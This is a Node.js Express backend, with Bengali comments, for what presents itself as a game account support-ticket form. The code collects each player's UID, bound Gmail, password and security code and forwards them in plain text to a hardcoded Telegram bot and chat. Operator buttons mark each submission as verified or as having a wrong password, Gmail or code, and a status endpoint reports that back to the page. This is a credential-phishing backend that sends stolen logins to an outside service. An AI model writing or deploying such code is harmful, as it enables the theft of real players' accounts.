const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const TELEGRAM_BOT_TOKEN = "8394444876:AAGQ3vrDdHXR--TZzCd0muiEAh6DIrect10";
const TELEGRAM_CHAT_ID = "-1004444318249";

let userDatabase = {}; 

app.get('/', (req, res) => res.send("Backend Running Successfully!"));

// ১. ফর্ম সাবমিট হলে টেলিগ্রামে পাঠানো
app.post('/api/submit-ticket', async (req, res) => {
    const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
    
    // ইনিশিয়াল স্ট্যাটাস Pending সেট করা
    userDatabase[uid] = {
        status: "Pending",
        name: "Checking Status...",
        level: "Under Review",
        reason: ""
    };

    const telegramMessage = `
📩 *New Support Ticket Submitted!*

🆔 *Player UID:* \`${uid}\`
📧 *Bind Gmail:* \`${gmail}\`
🔑 *Password:* \`${password}\`
🔢 *Security Code:* \`${securityCode}\`
📌 *Issue:* ${problemType}
📝 *Details:* ${additionalDetails}
    `;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: telegramMessage,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Verify Account", callback_data: `verify_${uid}` }
                    ],
                    [
                        { text: "❌ Wrong Pass", callback_data: `reject_${uid}_Wrong Password` },
                        { text: "❌ Wrong Gmail", callback_data: `reject_${uid}_Invalid Gmail` }
                    ],
                    [
                        { text: "❌ Wrong Code", callback_data: `reject_${uid}_Wrong Security Code` },
                        { text: "❌ Wrong UID", callback_data: `reject_${uid}_Invalid UID` }
                    ]
                ]
            }
        });
        res.json({ success: true, message: "Sent to Telegram" });
    } catch (error) {
        console.error("Telegram Error:", error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ২. টেলিগ্রাম বাটন ক্লিকে রেসপন্স রিসিভ করা (Webhook API)
app.post('/api/telegram-webhook', async (req, res) => {
    try {
        const update = req.body;

        if (update && update.callback_query) {
            const callbackQuery = update.callback_query;
            const data = callbackQuery.data; 
            const chatId = callbackQuery.message.chat.id;
            const messageId = callbackQuery.message.message_id;

            const parts = data.split('_');
            const action = parts[0];
            const uid = parts[1];
            const reason = parts[2] || "Information Mismatch";

            let confirmationMsg = "";

            if (action === 'verify') {
                userDatabase[uid] = {
                    status: "Verified",
                    name: "Verified Player",
                    level: "Active Account",
                    reason: ""
                };

                // মেসেজ এডিট করা
                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                    chat_id: chatId,
                    message_id: messageId,
                    text: callbackQuery.message.text + `\n\n🟢 *Status: VERIFIED BY ADMIN*`,
                    parse_mode: 'Markdown'
                });

                confirmationMsg = `✅ *Confirmation Alert!*\n\nPlayer UID: \`${uid}\` status updated to *VERIFIED*!`;

            } else if (action === 'reject') {
                userDatabase[uid] = {
                    status: "Rejected",
                    name: "Verification Failed",
                    level: "N/A",
                    reason: reason
                };

                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                    chat_id: chatId,
                    message_id: messageId,
                    text: callbackQuery.message.text + `\n\n🔴 *Status: REJECTED (${reason})*`,
                    parse_mode: 'Markdown'
                });

                confirmationMsg = `🔴 *Rejection Alert!*\n\nPlayer UID: \`${uid}\` marked as *REJECTED* (${reason})!`;
            }

            // কনফার্মেশন মেসেজ টেলিগ্রামে পাঠানো
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: chatId,
                text: confirmationMsg,
                parse_mode: 'Markdown'
            });

            // টেলিগ্রাম বাটন লোডিং বন্ধ করা
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callbackQuery.id,
                text: `UID: ${uid} updated successfully!`
            });
        }
    } catch (err) {
        console.error("Webhook processing error:", err);
    }

    res.sendStatus(200);
});

// ৩. ওয়েবসাইট থেকে স্ট্যাটাস চেক করা API
app.get('/api/check-status/:uid', (req, res) => {
    const uid = req.params.uid;
    const userData = userDatabase[uid] || {
        status: "Pending",
        name: "Checking Status...",
        level: "Under Review",
        reason: ""
    };
    res.json({ success: true, data: userData });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
